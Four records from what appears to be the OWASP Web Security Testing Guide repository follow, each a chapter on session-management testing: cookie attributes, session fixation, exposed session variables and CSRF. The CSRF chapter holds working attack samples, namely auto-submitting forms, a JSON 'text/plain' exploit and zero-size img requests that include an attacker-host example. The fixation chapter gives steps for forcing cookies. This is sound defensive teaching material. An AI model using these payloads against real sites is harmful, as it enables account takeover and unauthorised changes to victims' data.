{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/02-Testing_for_Cookies_Attributes.md", "content": "# Testing for Cookies Attributes\n\n|ID          |\n|------------|\n|WSTG-SESS-02|\n\n## Summary\n\nWeb Cookies (herein referred to as cookies) are often a key attack vector for malicious users (typically targeting other users) and the application should always take due diligence to protect cookies.\n\nHTTP is a stateless protocol, meaning that it doesn't hold any reference to requests being sent by the same user. In order to fix this issue, sessions were created and appended to HTTP requests. Browsers, as discussed in [testing browser storage](../11-Client-side_Testing/12-Testing_Browser_Storage.md), contain a multitude of storage mechanisms. In that section of the guide, each is discussed thoroughly.\n\nThe most used session storage mechanism in browsers is cookie storage. Cookies can be set by the server, by including a [`Set-Cookie`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie) header in the HTTP response or via JavaScript. Cookies can be used for a multitude of reasons, such as:\n\n- session management\n- personalization\n- tracking\n\nIn order to secure cookie data, the industry has developed means to help lock down these cookies and limit their attack surface. Over time cookies have become a preferred storage mechanism for web applications, as they allow great flexibility in use and protection.\n\nThe means to protect the cookies are:\n\n- [Cookie Attributes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Creating_cookies)\n- [Cookie Prefixes](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes)\n\n## Test Objectives\n\n- Ensure that the proper security configuration is set for cookies.\n\n## How to Test\n\nBelow, a description of every attribute and prefix will be discussed. The tester should validate that they are being used properly by the application. Cookies can be reviewed by using an [intercepting proxy](#intercepting-proxy), or by reviewing the browser's cookie jar.\n\n### Cookie Attributes\n\n#### Secure Attribute\n\nThe [`Secure`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#Secure) attribute tells the browser to only send the cookie if the request is being sent over a secure channel such as `HTTPS`. This will help protect the cookie from being passed in unencrypted requests. If the application can be accessed over both `HTTP` and `HTTPS`, an attacker could be able to redirect the user to send their cookie as part of non-protected requests.\n\n#### HttpOnly Attribute\n\nThe [`HttpOnly`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#HttpOnly) attribute is used to help prevent attacks such as session leakage, since it does not allow the cookie to be accessed via a client-side script such as JavaScript.\n\n> This doesn't limit the whole attack surface of XSS attacks, as an attacker could still send request in place of the user, but limits immensely the reach of XSS attack vectors.\n\n#### Domain Attribute\n\nThe [`Domain`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies) attribute is used to compare the cookie's domain against the domain of the server for which the HTTP request is being made. If the domain matches or if it is a subdomain, then the [`path`](#path-attribute) attribute will be checked next.\n\nNote that only hosts that belong to the specified domain can set a cookie for that domain. Additionally, the `domain` attribute cannot be a top level domain (such as `.gov` or `.com`) to prevent servers from setting arbitrary cookies for another domain (such as setting a cookie for `owasp.org`). If the domain attribute is not set, then the hostname of the server that generated the cookie is used as the default value of the `domain`.\n\nFor example, if a cookie is set by an application at `app.mydomain.com` with no domain attribute set, then the cookie would be resubmitted for all subsequent requests for `app.mydomain.com`, but not its subdomains (such as `hacker.app.mydomain.com`), or to `otherapp.mydomain.com`. (However, older versions of Edge/IE behave differently, and _do_ send these cookies to subdomains.) If a developer wanted to loosen this restriction, then they could set the `domain` attribute to `mydomain.com`. In this case the cookie would be sent to all requests for `app.mydomain.com` and `mydomain.com` subdomains, such as `hacker.app.mydomain.com`, and even `bank.mydomain.com`. If there was a vulnerable server on a subdomain (for example, `otherapp.mydomain.com`) and the `domain` attribute has been set too loosely (for example, `mydomain.com`), then the vulnerable server could be used to harvest cookies (such as session tokens) across the full scope of `mydomain.com`.\n\n#### Path Attribute\n\nThe [`Path`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Scope_of_cookies) attribute plays a major role in setting the scope of the cookies in conjunction with the [`domain`](#domain-attribute). In addition to the domain, the URL path that the cookie is valid for can be specified. If the domain and path match, then the cookie will be sent in the request. Just as with the domain attribute, if the path attribute is set too loosely, then it could leave the application vulnerable to attacks by other applications on the same server. For example, if the path attribute was set to the web server root `/`, then the application cookies will be sent to every application within the same domain (if multiple application reside under the same server). A couple of examples for multiple applications under the same server:\n\n- `path=/bank`\n- `path=/private`\n- `path=/docs`\n- `path=/docs/admin`\n\n#### Expires Attribute\n\nThe [`Expires`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Permanent_cookies) attribute is used to:\n\n- set persistent cookies\n- limit lifespan if a session lives for too long\n- remove a cookie forcefully by setting it to a past date\n\nUnlike [session cookies](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Session_cookies), persistent cookies will be used by the browser until the cookie expires. Once the expiration date has exceeded the time set, the browser will delete the cookie.\n\n#### SameSite Attribute\n\nThe [`SameSite`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#SameSite_cookies) attribute can be used to assert whether a cookie should be sent along with cross-site requests. This feature allows the server to mitigate the risk of cross-origin information leakage. In some cases, it is used too as a risk reduction (or defense in depth mechanism) strategy to prevent [cross-site request forgery](05-Testing_for_Cross_Site_Request_Forgery.md) attacks. This attribute can be configured in three different modes:\n\n- `Strict`\n- `Lax`\n- `None`\n\n##### Strict Value\n\nThe `Strict` value is the most restrictive usage of `SameSite`, allowing the browser to send the cookie only to first-party context without top-level navigation. In other words, the data associated with the cookie will only be sent on requests matching the current site shown on the browser URL bar. The cookie will not be sent on requests generated by third-party sites. This value is especially recommended for actions performed at the same domain. However, it can have some limitations with some session management systems negatively affecting the user navigation experience. Since the browser would not send the cookie on any requests generated from a third-party domain or email, the user would be required to sign in again even if they already have an authenticated session.\n\n##### Lax Value\n\nThe `Lax` value is less restrictive than `Strict`. The cookie will be sent if the URL equals the cookie’s domain (first-party) even if the link is coming from a third-party domain. This value is considered by most browsers the default behavior since it provides a better user experience than the `Strict` value. It doesn't trigger for assets, such as images, where cookies might not be needed to access them.\n\n##### None Value\n\nThe `None` value specifies that the browser will send the cookie in all contexts, including cross-site requests (the normal behavior before the implementation of `SameSite`). If `Samesite=None` is set, then the Secure attribute must be set, otherwise modern browsers will ignore the SameSite attribute, _e.g._ `SameSite=None; Secure`.\n\n### Cookie Prefixes\n\nBy design cookies do not have the capabilities to guarantee the integrity and confidentiality of the information stored in them. Those limitations make it impossible for a server to have confidence about how a given cookie's attributes were set at creation. In order to give the servers such features in a backwards-compatible way, the industry has introduced the concept of [`Cookie Name Prefixes`](https://tools.ietf.org/html/draft-ietf-httpbis-cookie-prefixes-00) to facilitate passing such details embedded as part of the cookie name.\n\n#### Host Prefix\n\nThe [`__Host-`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes) prefix expects cookies to fulfill the following conditions:\n\n  1. The cookie must be set with the [`Secure` attribute](#secure-attribute).\n  2. The cookie must be set from a URI considered secure by the user agent.\n  3. Sent only to the host who set the cookie and MUST NOT include any [`Domain` attribute](#domain-attribute).\n  4. The cookie must be set with the [`Path` attribute](#path-attribute) with a value of `/` so it would be sent with every request to the host.\n\nFor this reason, the cookie `Set-Cookie: __Host-SID=12345; Secure; Path=/` would be accepted while any of the following ones would always be rejected:\n`Set-Cookie: __Host-SID=12345`\n`Set-Cookie: __Host-SID=12345; Secure`\n`Set-Cookie: __Host-SID=12345; Domain=site.example`\n`Set-Cookie: __Host-SID=12345; Domain=site.example; Path=/`\n`Set-Cookie: __Host-SID=12345; Secure; Domain=site.example; Path=/`\n\n#### Secure Prefix\n\nThe [`__Secure-`](https://developer.mozilla.org/en-US/docs/Web/HTTP/Cookies#Cookie_prefixes) prefix is less restrictive and can be introduced by adding the case-sensitive string `__Secure-` to the cookie name. Any cookie that matches the prefix `__Secure-` would be expected to fulfill the following conditions:\n\n  1. The cookie must be set with the `Secure` attribute.\n  2. The cookie must be set from a URI considered secure by the user agent.\n\n### Strong Practices\n\nBased on the application needs, and how the cookie should function, the attributes and prefixes must be applied. The more the cookie is locked down, the better.\n\nPutting all this together, we can define the most secure cookie attribute configuration as: `Set-Cookie: __Host-SID=<session token>; path=/; Secure; HttpOnly; SameSite=Strict`.\n\n## Tools\n\n### Intercepting Proxy\n\n- [Zed Attack Proxy (ZAP)](https://www.zaproxy.org)\n- [Web Proxy Burp Suite](https://portswigger.net)\n\n### Browser Plug-in\n\n- [Tamper Data for FF Quantum](https://addons.mozilla.org/en-US/firefox/addon/tamper-data-for-ff-quantum/)\n- [\"FireSheep\" for FireFox](https://github.com/codebutler/firesheep)\n- [\"EditThisCookie\" for Chrome](https://chrome.google.com/webstore/detail/editthiscookie/fngmhnnpilhplaeedifhccceomclgfbg?hl=en)\n- [\"Cookiebro - Cookie Manager\" for FireFox](https://addons.mozilla.org/en-US/firefox/addon/cookiebro/)\n\n## References\n\n- [RFC 2965 - HTTP State Management Mechanism](https://tools.ietf.org/html/rfc2965)\n- [RFC 2616 – Hypertext Transfer Protocol – HTTP 1.1](https://tools.ietf.org/html/rfc2616)\n- [Same-Site Cookies - draft-ietf-httpbis-cookie-same-site-00](https://tools.ietf.org/html/draft-ietf-httpbis-cookie-same-site-00)\n- [The important \"expires\" attribute of Set-Cookie](https://seckb.yehg.net/2012/02/important-expires-attribute-of-set.html)\n- [HttpOnly Session ID in URL and Page Body](https://seckb.yehg.net/2012/06/httponly-session-id-in-url-and-page.html)\n- [Internet Explorer Cookie Internals (FAQ)](https://learn.microsoft.com/en-gb/archive/blogs/ieinternals/internet-explorer-cookie-internals-faq)\n", "timestamp": "2025-10-24T11:39:49.521503"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/03-Testing_for_Session_Fixation.md", "content": "# Testing for Session Fixation\n\n|ID          |\n|------------|\n|WSTG-SESS-03|\n\n## Summary\n\nSession fixation is enabled by the insecure practice of preserving the same value of the session cookies before and after authentication. This typically happens when session cookies are used to store state information even before login, e.g., to add items to a shopping cart before authenticating for payment.\n\nIn the generic exploit of session fixation vulnerabilities, an attacker can obtain a set of session cookies from the target site without first authenticating. The attacker can then force these cookies into the victim's browser using different techniques. If the victim later authenticates at the target site and the cookies are not refreshed upon login, the victim will be identified by the session cookies chosen by the attacker. The attacker is then able to impersonate the victim with these known cookies.\n\nThis issue can be fixed by refreshing the session cookies after the authentication process. Alternatively, the attack can be prevented by ensuring the integrity of session cookies. When considering network attackers, i.e., attackers who control the network used by the victim, use full [HSTS](https://en.wikipedia.org/wiki/HTTP_Strict_Transport_Security) or add the`__Host-` / `__Secure-` prefix to the cookie name.\n\nFull HSTS adoption occurs when a host activates HSTS for itself and all its sub-domains. This is described in a paper called *Testing for Integrity Flaws in Web Sessions* by Stefano Calzavara, Alvise Rabitti, Alessio Ragazzo, and Michele Bugliesi.\n\n## Test Objectives\n\n- Analyze the authentication mechanism and its flow.\n- Force cookies and assess the impact.\n\n## How to Test\n\nIn this section we give an explanation of the testing strategy that will be shown in the next section.\n\nThe first step is to make a request to the site to be tested (*e.g.* `www.example.com`). If the tester requests the following:\n\n```http\nGET / HTTP/1.1\nHost: www.example.com\n```\n\nThey will obtain the following response:\n\n```html\nHTTP/1.1 200 OK\nDate: Wed, 14 Aug 2008 08:45:11 GMT\nServer: IBM_HTTP_Server\nSet-Cookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1; Path=/; secure\nCache-Control: no-cache=\"set-cookie,set-cookie2\"\nExpires: Thu, 01 Dec 1994 16:00:00 GMT\nKeep-Alive: timeout=5, max=100\nConnection: Keep-Alive\nContent-Type: text/html;charset=Cp1254\nContent-Language: en-US\n```\n\nThe application sets a new session identifier, `JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1`, for the client.\n\nNext, if the tester successfully authenticates to the application with the following POST to `https://www.example.com/authentication.php`:\n\n```http\nPOST /authentication.php HTTP/1.1\nHost: www.example.com\n[...]\nReferer: https://www.example.com\nCookie: JSESSIONID=0000d8eyYq3L0z2fgq10m4v-rt4:-1\nContent-Type: application/x-www-form-urlencoded\nContent-length: 57\n\nName=Meucci&wpPassword=secret!&wpLoginattempt=Log+in\n```\n\nThe tester observes the following response from the server:\n\n```http\nHTTP/1.1 200 OK\nDate: Thu, 14 Aug 2008 14:52:58 GMT\nServer: Apache/2.2.2 (Fedora)\nX-Powered-By: PHP/5.1.6\nContent-language: en\nCache-Control: private, must-revalidate, max-age=0\nX-Content-Encoding: gzip\nContent-length: 4090\nConnection: close\nContent-Type: text/html; charset=UTF-8\n...\nHTML data\n...\n```\n\nAs no new cookie has been issued upon a successful authentication, the tester knows that it is possible to perform session hijacking unless the integrity of the session cookie is ensured.\n\nThe tester can send a valid session identifier to a user (possibly using a social engineering trick), wait for them to authenticate, and subsequently verify that privileges have been assigned to this cookie.\n\n### Test with Forced Cookies\n\nThis testing strategy is targeted at network attackers, hence it only needs to be applied to sites without full HSTS adoption (sites with full HSTS adoption are secure, since all their cookies have integrity). We assume to have two testing accounts on the site under test, one to act as the victim and one to act as the attacker. We simulate a scenario where the attacker forces in the victim's browser all the cookies which are not freshly issued after login and do not have integrity. After the victim's login, the attacker presents the forced cookies to the site to access the victim's account: if they are enough to act on the victim's behalf, session fixation is possible.\n\nHere are the steps for executing this test:\n\n1. Reach the login page of the site.\n2. Save a snapshot of the cookie jar before logging in, excluding cookies which contain the `__Host-` or `__Secure-` prefix in their name.\n3. Login to the site as the victim and reach any page offering a secure function requiring authentication.\n4. Set the cookie jar to the snapshot taken at step 2.\n5. Trigger the secure function identified at step 3.\n6. Observe whether the operation at step 5 has been performed successfully. If so, the attack was successful.\n7. Clear the cookie jar, login as the attacker and reach the page at step 3.\n8. Write in the cookie jar, one by one, the cookies saved at step 2.\n9. Trigger again the secure function identified at step 3.\n10. Clear the cookie jar and login again as the victim.\n11. Observe whether the operation at step 9 has been performed successfully in the victim's account. If so, the attack was successful; otherwise, the site is secure against session fixation.\n\nWe recommend using two different machines or browsers for the victim and the attacker. This allows you to decrease the number of false positives if the web application does fingerprinting to verify access enabled from a given cookie. A shorter but less precise variant of the testing strategy only requires one testing account. It follows the same steps, but it halts at step 6.\n\n## Remediation\n\nImplement a session token renewal after a user successfully authenticates.\n\nThe application should always first invalidate the existing session ID before authenticating a user, and if the authentication is successful, provide another session ID.\n\n## Tools\n\n- [ZAP](https://www.zaproxy.org)\n\n## References\n\n- [Session Fixation](https://owasp.org/www-community/attacks/Session_fixation)\n- [ACROS Security](https://www.acrossecurity.com/papers/session_fixation.pdf)\n- [Chris Shiflett](https://shiflett.org/articles/session-fixation)\n", "timestamp": "2025-10-24T11:39:49.613313"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/04-Testing_for_Exposed_Session_Variables.md", "content": "# Testing for Exposed Session Variables\n\n|ID          |\n|------------|\n|WSTG-SESS-04|\n\n## Summary\n\nThe Session Tokens (Cookie, SessionID, Hidden Field), if exposed, will usually enable an attacker to impersonate a victim and access the application illegitimately. It is important that they are protected from eavesdropping at all times, particularly whilst in transit between the client browser and the application servers.\n\nThe information here relates to how transport security applies to the transfer of sensitive Session ID data rather than data in general, and may be stricter than the caching and transport policies applied to the data served by the site.\n\nUsing a personal proxy, it is possible to ascertain the following about each request and response:\n\n- Protocol used (e.g., HTTP vs. HTTPS)\n- HTTP Headers\n- Message Body (e.g., POST or page content)\n\nEach time Session ID data is passed between the client and the server, the protocol, cache, and privacy directives and body should be examined. Transport security here refers to Session IDs passed in GET or POST requests, message bodies, or other means over valid HTTP requests.\n\n## Test Objectives\n\n- Ensure that proper encryption is implemented.\n- Review the caching configuration.\n- Assess the channel and methods' security.\n\n## How to Test\n\n### Testing for Encryption & Reuse of Session Tokens Vulnerabilities\n\nProtection from eavesdropping is often provided by TLS encryption, but may incorporate other tunneling or encryption. It should be noted that encryption or cryptographic hashing of the Session ID should be considered separately from transport encryption, as it is the Session ID itself being protected, not the data that may be represented by it.\n\nIf the Session ID could be presented by an attacker to the application to gain access, then it must be protected in transit to mitigate that risk. It should therefore be ensured that encryption is both the default and enforced for any request or response where the Session ID is passed, regardless of the mechanism used (e.g., a hidden form field). Simple checks such as replacing `https://` with `http://` during interaction with the application should be performed, together with modification of form posts to determine if adequate segregation between the secure and non-secure sites is implemented.\n\nNote that if there is also an element to the site where the user is tracked with Session IDs but security is not present (e.g., noting which public documents a registered user downloads) it is essential that a different Session ID is used. The Session ID should therefore be monitored as the client switches from the secure to non-secure elements to ensure a different one is used.\n\n> Every time the authentication is successful, the user should expect to receive:\n>\n> - A different session token\n> - A token sent via encrypted channel every time they make an HTTP Request\n\n### Testing for Proxies & Caching Vulnerabilities\n\nProxies must also be considered when reviewing application security. In many cases, clients will access the application through corporate, ISP, or other proxies or protocol aware gateways (e.g., Firewalls). The HTTP protocol provides directives to control the behavior of downstream proxies, and the correct implementation of these directives should also be assessed.\n\nIn general, the Session ID should never be sent over unencrypted transport and should never be cached. The application should be examined to ensure that encrypted communications are both the default and enforced for any transfer of Session IDs. Furthermore, whenever the Session ID is passed, directives should be in place to prevent its caching by intermediate and even local caches.\n\nThe application should also be configured to secure data in caches over both HTTP/1.0 and HTTP/1.1 – RFC 2616 discusses the appropriate controls with reference to HTTP. HTTP/1.1 provides a number of cache control mechanisms. `Cache-Control: no-cache` indicates that a proxy must not re-use any data. Whilst `Cache-Control: Private` appears to be a suitable directive, this still allows a non-shared proxy to cache data. In the case of web-cafes or other shared systems, this presents a clear risk. Even with single-user workstations the cached Session ID may be exposed through a compromise of the file-system or where network stores are used. HTTP/1.0 caches do not recognise the `Cache-Control: no-cache` directive.\n\n> The `Expires: 0` and `Cache-Control: max-age=0` directives should be used to further ensure caches do not expose the data. Each request/response passing Session ID data should be examined to ensure appropriate cache directives are in use.\n\n### Testing for GET & POST Vulnerabilities\n\nIn general, GET requests should not be used, as the Session ID may be exposed in Proxy or Firewall logs. They are also far more easily manipulated than other types of transport, although it should be noted that almost any mechanism can be manipulated by the client with the right tools. Furthermore, [Cross-site Scripting (XSS)](https://owasp.org/www-community/attacks/xss/) attacks are most easily exploited by sending a specially constructed link to the victim. This is far less likely if data is sent from the client as POSTs.\n\nAll server-side code receiving data from POST requests should be tested to ensure it does not accept the data if sent as a GET. For example, consider the following POST request (`https://owaspapp.com/login.asp`) generated by a log in page.\n\n```http\nPOST /login.asp HTTP/1.1\nHost: owaspapp.com\n[...]\nCookie: ASPSESSIONIDABCDEFG=ASKLJDLKJRELKHJG\nContent-Length: 51\n\nLogin=Username&password=Password&SessionID=12345678\n```\n\nIf login.asp is badly implemented, it may be possible to log in using the following URL: `https://owaspapp.com/login.asp?Login=Username&password=Password&SessionID=12345678`\n\nPotentially insecure server-side scripts may be identified by checking each POST in this way.\n\n### Testing for Transport Vulnerabilities\n\nAll interaction between the Client and Application should be tested at least against the following criteria.\n\n- How are Session IDs transferred? e.g., GET, POST, Form Field (including hidden fields)\n- Are Session IDs always sent over encrypted transport by default?\n- Is it possible to manipulate the application to send Session IDs unencrypted? e.g., by changing HTTPS to HTTP?\n- What cache-control directives are applied to requests/responses passing Session IDs?\n- Are these directives always present? If not, where are the exceptions?\n- Are GET requests incorporating the Session ID used?\n- If POST is used, can it be interchanged with GET?\n\n## References\n\n### Whitepapers\n\n- [RFCs 2109 and 2965 – HTTP State Management Mechanism - D. Kristol, L. Montulli](https://www.ietf.org/rfc/rfc2965.txt)\n- [RFC 2616 – Hypertext Transfer Protocol - HTTP/1.1](https://www.ietf.org/rfc/rfc2616.txt)\n", "timestamp": "2025-10-24T11:39:49.693865"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/06-Session_Management_Testing/05-Testing_for_Cross_Site_Request_Forgery.md", "content": "# Testing for Cross Site Request Forgery\n\n|ID          |\n|------------|\n|WSTG-SESS-05|\n\n## Summary\n\nCross-Site Request Forgery ([CSRF](https://owasp.org/www-community/attacks/csrf)) is an attack that forces an end user to execute unintended actions on a web application in which they are currently authenticated. With a little social engineering help (like sending a link via email or chat), an attacker may force the users of a web application to execute actions of the attacker's choosing. A successful CSRF exploit can compromise end user data and operation when it targets a normal user. If the targeted end user is the administrator account, a CSRF attack can compromise the entire web application.\n\nCSRF relies on:\n\n1. Web browser behavior regarding the handling of session-related information such as cookies and HTTP authentication information.\n2. An attacker's knowledge of valid web application URLs, requests, or functionality.\n3. Application session management relying only on information known by the browser.\n4. Existence of HTML tags whose presence cause immediate access to an HTTP[S] resource; for example the image tag `img`.\n\nPoints 1, 2, and 3 are essential for the vulnerability to be present, while point 4 facilitates the actual exploitation, but is not strictly required.\n\n1. Browsers automatically send information used to identify a user session. Suppose *site* is a site hosting a web application, and the user *victim* has just authenticated to *site*. In response, *site* sends *victim* a cookie that identifies requests sent by *victim* as belonging to *victim’s* authenticated session. Once the browser receives the cookie set by *site*, it will automatically send it along with any further requests directed to *site*.\n2. If the application does not make use of session-related information in URLs, then the application URLs, their parameters, and legitimate values may be identified. This may be accomplished by code analysis or by accessing the application and taking note of forms and URLs embedded in the HTML or JavaScript.\n3. \"Known by the browser\" refers to information such as cookies or HTTP-based authentication information (such as Basic Authentication and not form-based authentication), that are stored by the browser and subsequently present at each request directed towards an application area requesting that authentication. The vulnerabilities discussed next apply to applications that rely entirely on this kind of information to identify a user session.\n\nFor simplicity's sake, consider GET-accessible URLs (though the discussion applies as well to POST requests). If *victim* has already authenticated themselves, submitting another request causes the cookie to be automatically sent with it. The figure below illustrates the user accessing an application on `www.example.com`.\n\n![Session Riding](images/Session_riding.GIF)\\\n*Figure 4.6.5-1: Session Riding*\n\nThe GET request could be sent by the user in several different ways:\n\n- Using the web application\n- Typing the URL directly in the browser\n- Following an external link that points to the URL\n\nThese invocations are indistinguishable by the application. In particular, the third may be quite dangerous. There are a number of techniques and vulnerabilities that can disguise the real properties of a link. The link can be embedded in an email message, appear in a malicious site to which the user is lured, or appear in content hosted by a third-party (such as another site or HTML email) and point to a resource of the application. If the user clicks on the link, since they are already authenticated by the web application on *site*, the browser will issue a GET request to the web application, accompanied by authentication information (the session ID cookie). This results in a valid operation being performed on the web application that the user does not expect; for example, a funds transfer on a web banking application.\n\nBy using a tag such as `img`, as specified in point 4 above, it is not even necessary that the user follows a particular link. Suppose the attacker sends the user an email inducing them to visit a URL referring to a page containing the following (oversimplified) HTML.\n\n```html\n<html>\n    <body>\n...\n<img src=\"https://www.company.example/action\" width=\"0\" height=\"0\">\n...\n    </body>\n</html>\n```\n\nWhen the browser displays this page, it will try to display the specified zero-dimension (thus, invisible) image from `https://www.company.example` as well. This results in a request being automatically sent to the web application hosted on *site*. It is not important that the image URL does not refer to a proper image, as its presence will trigger the request `action` specified in the `src` field anyway. This happens provided that image download is not disabled in the browser. Most browsers do not have image downloads disabled since that would cripple most web applications beyond usability.\n\nThe problem here is a consequence of:\n\n- HTML tags on the page resulting in automatic HTTP request execution (`img` being one of those).\n- The browser having no way to tell that the resource referenced by `img` is not a legitimate image.\n- Image loading that happens regardless of the location of the alleged image source, i.e., the form and the image itself need not be located on the same host or even the same domain.\n\nThe fact that HTML content unrelated to the web application may refer to components in the application, and the fact that the browser automatically composes a valid request towards the application, allows this kind of attack. There is no way to prohibit this behavior unless it is made impossible for the attacker to interact with application functionality.\n\nIn integrated mail/browser environments, simply displaying an email message containing the image reference would result in the execution of the request to the web application with the associated browser cookie. Email messages may reference seemingly valid image URLs such as:\n\n```html\n<img src=\"https://[attacker]/picture.gif\" width=\"0\" height=\"0\">\n```\n\nIn this example, `[attacker]` is a site controlled by the attacker. By utilizing a redirect mechanism, the malicious site may use `https://[attacker]/picture.gif` to direct the victim to `https://[thirdparty]/action` and trigger the `action`.\n\nCookies are not the only example involved in this kind of vulnerability. Web applications whose session information is entirely supplied by the browser are vulnerable too. This includes applications relying on HTTP authentication mechanisms alone, since the authentication information is known by the browser and is sent automatically upon each request. This does not include form-based authentication, which occurs just once and generates some form of session-related information, usually a cookie.\n\nLet’s suppose that the victim is logged on to a firewall web management console. To log in, a user has to authenticate themselves and session information is stored in a cookie.\n\nLet's suppose the firewall web management console has a function that allows an authenticated user to delete a rule specified by its numerical ID, or all the rules in the configuration if the user specifies `*` (a dangerous feature in reality, but one that makes for a more interesting example). The delete page is shown next. Let’s suppose that the form – for the sake of simplicity – issues a GET request. To delete rule number one:\n\n```text\nhttps://[target]/fwmgt/delete?rule=1\n```\n\nTo delete all rules:\n\n```text\nhttps://[target]/fwmgt/delete?rule=*\n```\n\nThis example is intentionally naive, but shows in a simplified way the dangers of CSRF.\n\n![Session Riding Firewall Management](images/Session_Riding_Firewall_Management.gif)\\\n*Figure 4.6.5-2: Session Riding Firewall Management*\n\nUsing the form pictured in the figure above, entering the value `*` and clicking the Delete button will submit the following GET request:\n\n```text\nhttps://www.company.example/fwmgt/delete?rule=*\n```\n\nThis would delete all firewall rules.\n\n![Session Riding Firewall Management 2](images/Session_Riding_Firewall_Management_2.gif)\\\n*Figure 4.6.5-3: Session Riding Firewall Management 2*\n\nThe user might also have accomplished the same results by manually submitting the URL:\n\n```text\nhttps://[target]/fwmgt/delete?rule=*\n```\n\nOr by following a link pointing, directly or via a redirection, to the above URL. Or, again, by accessing an HTML page with an embedded `img` tag pointing to the same URL.\n\nIn all of these cases, if the user is currently logged in to the firewall management application, the request will succeed and will modify the configuration of the firewall. One can imagine attacks targeting sensitive applications and making automatic auction bids, money transfers, orders, changing the configuration of critical software components, etc.\n\nAn interesting thing is that these vulnerabilities may be exercised behind a firewall; i.e. it is sufficient that the link being attacked be reachable by the victim and not directly by the attacker. In particular, it can be any intranet web server; for example, in the firewall management scenario mentioned before, which is unlikely to be exposed to the internet.\n\nSelf-vulnerable applications, i.e. applications that are used both as attack vector and target (such as web mail applications), make things worse. Since users are logged in when they read their email messages, a vulnerable application of this type can allow attackers to perform actions such as deleting messages or sending messages that appear to originate from the victim.\n\n## Test Objectives\n\n- Determine whether it is possible to initiate requests on a user's behalf that are not initiated by the user.\n\n## How to Test\n\nAudit the application to ascertain if its session management is vulnerable. If session management relies only on client-side values (information available to the browser), then the application is vulnerable. \"Client-side values\" refers to cookies and HTTP authentication credentials (Basic Authentication and other forms of HTTP authentication; not form-based authentication, which is an application-level authentication).\n\nResources accessible via HTTP GET requests are easily vulnerable, though POST requests can be automated via JavaScript and are vulnerable as well; therefore, the use of POST alone is not enough to correct the occurrence of CSRF vulnerabilities.\n\nIn case of POST, the following sample can be used.\n\n1. Create an HTML page similar to that shown below\n2. Host the HTML on a malicious or third-party site\n3. Send the link for the page to the victim(s) and induce them to click it.\n\n```html\n<html>\n<body onload='document.CSRF.submit()'>\n\n<form action='https://targetWebsite/Authenticate.jsp' method='POST' name='CSRF'>\n    <input type='hidden' name='name' value='Hacked'>\n    <input type='hidden' name='password' value='Hacked'>\n</form>\n\n</body>\n</html>\n```\n\nIn case of web applications in which developers are utilizing JSON for browser to server communication, a problem may arise with the fact that there are no query parameters with the JSON format, which are a must with self-submitting forms. To bypass this case, we can use a self-submitting form with JSON payloads including hidden input to exploit CSRF. We'll have to change the encoding type (`enctype`) to `text/plain` to ensure the payload is delivered as-is. The exploit code will look like the following:\n\n```html\n<html>\n <body>\n  <script>history.pushState('', '', '/')</script>\n   <form action='https://victimsite.com' method='POST' enctype='text/plain'>\n     <input type='hidden' name='{\"name\":\"hacked\",\"password\":\"hacked\",\"padding\":\"'value='something\"}' />\n     <input type='submit' value='Submit request' />\n   </form>\n </body>\n</html>\n```\n\nThe POST request will be as follow:\n\n```http\nPOST / HTTP/1.1\nHost: victimsite.com\nContent-Type: text/plain\n\n{\"name\":\"hacked\",\"password\":\"hacked\",\"padding\":\"=something\"}\n```\n\nWhen this data is sent as a POST request, the server will happily accept the name and password fields and ignore the one with the name padding as it does not need it.\n\n## Remediation\n\n- See the [OWASP CSRF Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html) for prevention measures.\n\n## Tools\n\n- [ZAP](https://www.zaproxy.org/)\n- [CSRF Tester](https://wiki.owasp.org/index.php/Category:OWASP_CSRFTester_Project)\n- [Pinata-csrf-tool](https://code.google.com/archive/p/pinata-csrf-tool/)\n\n## References\n\n- [Peter W: \"Cross-Site Request Forgeries\"](https://web.archive.org/web/20160303230910/http://www.tux.org/~peterw/csrf.txt)\n- [Thomas Schreiber: \"Session Riding\"](https://web.archive.org/web/20160304001446/https://www.securenet.de/papers/Session_Riding.pdf)\n- [Oldest known post](https://web.archive.org/web/20000622042229/https://www.zope.org/Members/jim/ZopeSecurity/ClientSideTrojan)\n- [Cross-site Request Forgery FAQ](https://www.cgisecurity.com/csrf-faq.html)\n- [A Most-Neglected Fact About Cross Site Request Forgery (CSRF)](https://yehg.net/lab/pr0js/view.php/A_Most-Neglected_Fact_About_CSRF.pdf)\n- [Multi-POST CSRF](https://www.lanmaster53.com/2013/07/17/multi-post-csrf/)\n- [SANS Pen Test Webcast: Complete Application pwnage via Multi POST XSRF](https://www.youtube.com/watch?v=EOs5PZiiwug)\n", "timestamp": "2025-10-24T11:39:49.802759"}
